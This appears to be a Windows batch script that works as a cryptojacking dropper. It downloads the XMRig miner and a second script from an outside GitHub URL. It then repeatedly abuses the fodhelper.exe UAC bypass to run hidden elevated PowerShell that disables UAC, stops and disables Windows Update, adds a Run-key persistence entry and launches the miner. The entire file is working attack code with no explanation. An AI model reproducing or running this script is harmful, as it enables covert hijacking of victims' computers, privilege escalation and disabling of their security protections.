powershell Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-gcc-win64.zip" -OutFile "C:\Users\Public\Downloads\xmrig.zip"
powershell Expand-Archive -LiteralPath C:\Users\Public\Downloads\xmrig.zip -DestinationPath C:\Users\Public\Downloads
powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/restartado.sh" -OutFile "C:\Users\Public\Downloads\xmrig-6.18.1\vai.cmd"
cls
powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command Set-itemproperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System EnableLUA 0""" -Force
powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force
fodhelper.exe
powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command NET Stop WUAUSERV""" -Force
powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force
fodhelper.exe
fodhelper.exe
cls
powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command Set-itemproperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU NoAutoRebootWithLoggedOnUsers 1""" -Force
powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force
fodhelper.exe
cls
powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command Set-itemproperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU AlwaysAutoRebootAtScheduledTime 0""" -Force
powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force
fodhelper.exe
cls
powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command Set-itemproperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU NoAutoUpdate 1""" -Force
powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force
fodhelper.exe
cls
powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command set-itemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run nomee111 C:\Users\Public\Downloads\xmrig-6.18.1\vai.cmd""" -Force
powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force
fodhelper.exe
cls
powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command NET Start WUAUSERV""" -Force
powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force
fodhelper.exe
cls
powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command Start-Process C:\Users\Public\Downloads\xmrig-6.18.1\vai.cmd""" -Force
powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force
fodhelper.exe
exit
